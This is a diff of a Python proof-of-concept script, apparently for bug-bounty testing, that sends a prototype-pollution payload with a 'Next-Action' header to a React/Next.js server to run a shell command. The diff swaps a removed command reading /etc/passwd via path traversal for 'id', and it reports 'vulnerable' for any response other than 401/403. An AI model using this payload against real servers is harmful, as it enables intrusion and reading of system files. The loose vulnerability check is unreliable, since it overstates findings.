@@ -18,7 +18,7 @@ def main():
     print(f"[DEBUG] stack_name={stack_name}", file=sys.stderr)
 
     try:
-        command = "cat ../../../../../../../../../../../../../../etc/passwd"
+        command = "id"
 
         payload = {
             "then": "$1:__proto__:then",
@@ -40,19 +40,30 @@ def main():
 
         headers = {
             "Next-Action": "x",
-            "User-Agent": "SecurityResearch-PoC/test",
+            "User-Agent": "BugBounty-033ca182-dcdd-406b-bcb5-816d726ca809",
         }
 
         response = requests.post(base_url, headers=headers, files=files, timeout=3)
         
-        result = {
-            "poc_name": "react_test",
-            "status": "Completed",
-            "description": "check directory f,  react , next.js 버전 업데이트 필요",
-            "evidence": f"HTTP {response.status_code}",
-            "raw_output": response.text[:500],
-            "vulnerable": True,
-        }
+        if response.status_code in (401, 403):
+            result = {
+                "poc_name": "react_test",
+                "status": "Completed",
+                "description": "접근이 차단되어 취약점이 확인되지 않았다.",
+                "evidence": f"HTTP {response.status_code}",
+                "raw_output": response.text[:500],
+                "vulnerable": False,
+            }
+        else: 
+            result = {
+                "poc_name": "react_test",
+                "status": "Completed",
+                "description": "react , next.js 버전 업데이트 필요",
+                "evidence": f"HTTP {response.status_code}",
+                "raw_output": response.text[:500],
+                "vulnerable": True,
+            }
+
     except Exception as e:
         result = {
             "poc_name": "react_test",
